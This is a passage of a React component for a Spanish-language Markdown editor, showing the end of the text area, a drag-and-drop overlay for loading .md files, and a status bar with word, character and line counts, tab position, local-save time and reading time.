            placeholder="Escribe o pega aquí tu código Markdown, o pulsa 'Cargar .md en pestaña'..."
            className={`w-full flex-1 font-mono text-slate-800 bg-transparent resize-none outline-none select-text selection:bg-indigo-100 selection:text-indigo-900 ${
              isZenMode
                ? 'text-base leading-loose p-2'
                : 'text-sm leading-relaxed p-4'
            }`}
            spellCheck={false}
          />
        </div>

        {/* Drag Overlay Notice */}
        {isDragging && (
          <div className="absolute inset-0 bg-indigo-50/90 backdrop-blur-2xs flex flex-col items-center justify-center pointer-events-none p-6 text-center">
            <FileCode className="w-12 h-12 text-indigo-600 mb-2 animate-bounce" />
            <p className="font-semibold text-indigo-900 text-base">
              Suelta tu archivo .md aquí
            </p>
            <p className="text-xs text-indigo-700 mt-1">
              (Mantén pulsado Shift mientras sueltas para cargarlo como una nueva pestaña)
            </p>
          </div>
        )}
      </div>

      {/* Editor Bottom Status Bar */}
      <div className="border-t border-slate-200 bg-slate-50 px-4 py-2 flex items-center justify-between text-xs text-slate-500 shrink-0">
        <div className="flex items-center gap-3">
          <span>{wordsCount.toLocaleString()} palabras</span>
          <span aria-hidden="true">·</span>
          <span>{charsCount.toLocaleString()} caracteres</span>
          <span aria-hidden="true">·</span>
          <span>{linesCount.toLocaleString()} líneas</span>
          {tabs.length > 1 && (
            <>
              <span aria-hidden="true">·</span>
              <span className="font-medium text-indigo-600">
                Pestaña {tabs.findIndex((t) => t.id === activeTabId) + 1} de {tabs.length}
              </span>
            </>
          )}
          {lastSaved && (
            <>
              <span aria-hidden="true">·</span>
              <span
                className="text-emerald-700 font-medium flex items-center gap-1.5"
                title={`Guardado local en tu navegador: reactivo al escribir y sincronizado cada 30 segundos (Último guardado: ${lastSaved.toLocaleTimeString()})`}
              >
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block animate-pulse" />
                <span>Guardado en local ({lastSaved.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })})</span>
              </span>
            </>
          )}
        </div>
        <div className="text-slate-400 hidden sm:block">
          ~{readTimeMin} min de lectura
        </div>
      </div>
    </div>
  );
};
